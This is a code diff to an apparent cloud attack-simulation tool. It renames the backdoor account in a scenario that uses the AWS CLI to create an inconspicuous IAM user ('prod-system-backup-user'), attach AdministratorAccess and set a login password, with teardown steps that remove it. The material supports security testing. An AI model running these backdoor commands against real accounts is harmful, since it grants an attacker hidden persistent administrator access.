@@ -28,6 +28,7 @@ class ScenarioExecution:
         self.exfil_bucket_name = None
         self.compromised_ec2_key = "./compromised_id_rsa"
         self.attacker_ec2_key = "./attacker_id_rsa"
+        self.backdoor_username = "prod-system-backup-user"
         self.attacker_env_vars = {}
 
         self.discovered_roles = []
@@ -179,14 +180,14 @@ class ScenarioExecution:
 
     def attempt_backdoor(self):
         # Create new user
-        error_code = self.attacker_run("aws iam create-user --user-name prod-system-backup-user")
+        error_code = self.attacker_run(f"aws iam create-user --user-name {self.backdoor_username}")
         if error_code != 0:
             print(colored("Failed to create new IAM user", "red"))
             return False
 
         # Attach admin policy
         error_code = self.attacker_run(
-            "aws iam attach-user-policy --user-name test-user-demo8 --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+            f"aws iam attach-user-policy --user-name {self.backdoor_username} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
         )
         if error_code != 0:
             print(colored("Failed to attach admin policy to new IAM user", "red"))
@@ -195,10 +196,10 @@ class ScenarioExecution:
         # Create password for user
         password_charset = string.ascii_letters + string.digits
         generated_password = ''.join(random.choices(password_charset, k=12))
-        print(colored(f"Generated password for backdoor user: {generated_password}", "red"))
+        print(colored(f"Generated password for backdoor user {self.backdoor_username}:{generated_password}", "red"))
 
         error_code = self.attacker_run(
-            f"aws iam create-login-profile --user-name test-user-demo8 --password {generated_password}")
+            f"aws iam create-login-profile --user-name {self.backdoor_username} --password {generated_password}")
         if error_code != 0:
             print(colored("Failed to create login profile for new IAM user", "red"))
             return False
@@ -321,11 +322,11 @@ class ScenarioExecution:
 
     def scenario_8_destroy(self):
         print(colored("Removing backdoor user...", "red"))
-        run_subprocess("aws iam delete-login-profile --user-name test-user-demo8", check=False)
+        run_subprocess(f"aws iam delete-login-profile --user-name {self.backdoor_username}", check=False)
         run_subprocess(
-            "aws iam detach-user-policy --user-name test-user-demo8 --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+            f"aws iam detach-user-policy --user-name {self.backdoor_username} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
             check=False)
-        run_subprocess("aws iam delete-user --user-name test-user-demo8", check=False)
+        run_subprocess(f"aws iam delete-user --user-name {self.backdoor_username}", check=False)
 
         print(colored("Destroying infra...", "red"))
         run_subprocess("cd ./scenarios/scenario_8/infra && pulumi destroy -s cobra-scenario-8 --yes")
